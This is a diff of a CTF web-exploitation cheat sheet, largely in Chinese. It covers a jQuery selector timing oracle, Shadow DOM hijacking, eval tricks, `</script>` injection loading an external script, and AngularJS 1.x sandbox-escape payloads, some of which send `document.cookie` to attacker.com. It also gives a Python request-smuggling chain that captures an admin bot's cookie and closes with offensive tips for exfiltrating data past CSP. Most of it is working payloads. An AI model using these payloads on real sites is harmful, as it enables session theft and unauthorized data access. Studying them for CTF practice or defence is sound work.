-**Pattern:** Target page calls `$(location.hash).addClass(...)`. Passing a URL fragment that parses as a CSS selector causes jQuery to invoke Sizzle, which walks the DOM matching the selector. Stacking deeply nested `:has()` pseudo-classes blows up selector evaluation time predictably (~2 s) only when the selector *matches*, creating a Boolean timing oracle on any attribute the bot's DOM exposes (for example `body[data-user-id^='1']`).
-
-```text
 http://127.0.0.1/?id=...#*:has(*:has(*:has(*:has(*:has(body[data-user-id^='1'])))))
 ```
 
-Exfiltrate by firing two `new Image().src` requests to attacker-controlled endpoints (`/firstping`, `/secondping`) around the `addClass` call and measuring the delta: ~20 ms = mismatch, ~2 s = match.
+深嵌套 `:has()` 在**匹配时**耗时 ~2s，不匹配时 ~20ms。在 `addClass` 前后各打一次 `new Image().src`，比时间差就是布尔 oracle。
 
-**Key insight:** jQuery's `$` with a string argument treats anything beginning with `<` as HTML and everything else as a selector. Any sink that lets an attacker put arbitrary text into `$()` becomes both an XSS and a selector-timing oracle.
+**判据**：jQuery 的 `$()` 接收字符串时，`<` 开头当 HTML、否则当选择器。**任何能让攻击者把文本塞进 `$()` 的 sink，既是 XSS 也是选择器时序 oracle。**
 
-**References:** hxp CTF 2018 — µblog, writeup 12554
+（题目例证：hxp 2018 — µblog）
+
+### 7.3 Shadow DOM 与闭包逃逸
+
+闭包 shadow root 拿不到时，用 Proxy 劫持 `attachShadow`：
+
+```javascript
+var _r, _o = Element.prototype.attachShadow;
+Element.prototype.attachShadow = new Proxy(_o, {
+  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
+});
+// 目标脚本创建 shadow DOM 后，_r 就是 root
+```
+
+**间接 eval 跳出 with 作用域**：`(0,eval)('code')` 摆脱 `with(document)` 的限制。
+
+**payload 走私**：把 JS 藏在头像 URL 固定前缀之后，用 `slice` 取出：
+
+```html
+<svg/onload=(0,eval)('eval(avatar.slice(24))')>
+```
+
+**`</script>` 注入**：关键字过滤常漏 HTML 结构标签。`</script>` 闭合当前脚本上下文，`<script src=//evil>` 载入外部脚本，外部脚本从 `document.scripts[].textContent` 读 flag。
+
+### 7.4 AngularJS 1.x 沙箱逃逸
+
+沙箱靠 `charAt` 逐字符校验标识符。把 `charAt` 换成 `trim`（返回整串而非单字符）就废掉校验：
+
+```javascript
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
+```
+
+按版本：
+
+```javascript
+<!-- 1.5.x -->
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}
+<!-- 1.4.x -->
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
+<!-- 1.3.x -->
+{{constructor.constructor('return window.location="http://attacker.com/"+document.cookie')()}}
+```
+
+**判据**：HTML 里有 `ng-app` / `ng-controller`，加载了 `angular.js`，且 `{{ }}` 里能反射输入。AngularJS 1.6+ 已移除沙箱（承认它不是安全边界），但老项目还在用。
+
+（题目例证：Google CTF 2017）
+
+---
+
+## 8. 缓存代理导致的请求走私
+
+缓存 TCP 代理返回缓存响应时**不消费请求体**，剩余字节被当成下一个请求解析。
+
+**偷 cookie 的链**：
+
+1. 造一个可缓存资源（如博客文章）
+2. 发请求：缓存 URL + 追加一个不完整的 POST（大 `Content-Length`、只给部分 body）
+3. 代理直接返回缓存，不消费 POST body
+4. admin bot 的下一个请求字节**补进这个 POST body** → 被存到服务端
+5. 读回存储内容，提取 admin 的 cookie
+
+```python
+inner_req = (
+    f"POST /create HTTP/1.1\r\n"
+    f"Host: {HOST}\r\n"
+    f"Cookie: session={user_session}\r\n"
+    f"Content-Length: 256\r\n"     # 声明大，实际只发一部分
+    f"\r\n"
+    f"content=LEAK_"               # 受害者的请求会补全这里
+)
+outer_req = (
+    f"GET /cached-page HTTP/1.1\r\n"
+    f"Content-Length: {len(inner_req)}\r\n"
+    f"\r\n"
+).encode() + inner_req
+```
+
+**判据**：缓存层是 TCP 代理而非 HTTP 感知代理时，返回缓存后可能不读 body。完整手法见 [HTTP 请求走私测试](HTTP请求走私/HTTP 请求走私测试.md)。
+
+---
+
+## 9. 纪律
+
+- **先看净化发生在哪一侧**。前端净化 = 后端一定有绕过路径（§2.1）。这是收益最高的一步，比研究过滤规则快得多。
+- **有 bot 就别打反射 XSS**。反射 XSS 只能打自己，bot 才能拿到 admin 数据。先找 bot 的可达面（本地地址、认证态、URL 校验缺陷）。
+- **CSP 严格时换侧信道，别硬绕**。§7 的时序类手法不需要注入脚本，只要有 HTML 注入或 URL 参数控制。
+- **外带通道要按 CSP 强度选**。同源自上传 > DNS 外带 > 外部 webhook。先假设外部 webhook 会被拦。
+- **MIME 混淆要对比测试**：同一内容换扩展名（`.jpg`/`.jpeg`/`.JPG`/无扩展名）看 `Content-Type` 变化，比读代码快。
+- **`new URL()` 不是校验**。看到它就直接试 `javascript:` / `data:`。
+- **报的是「读到了 admin 的数据」不是「有 XSS」**。XSS 是手段，成果是跨权限的数据访问。
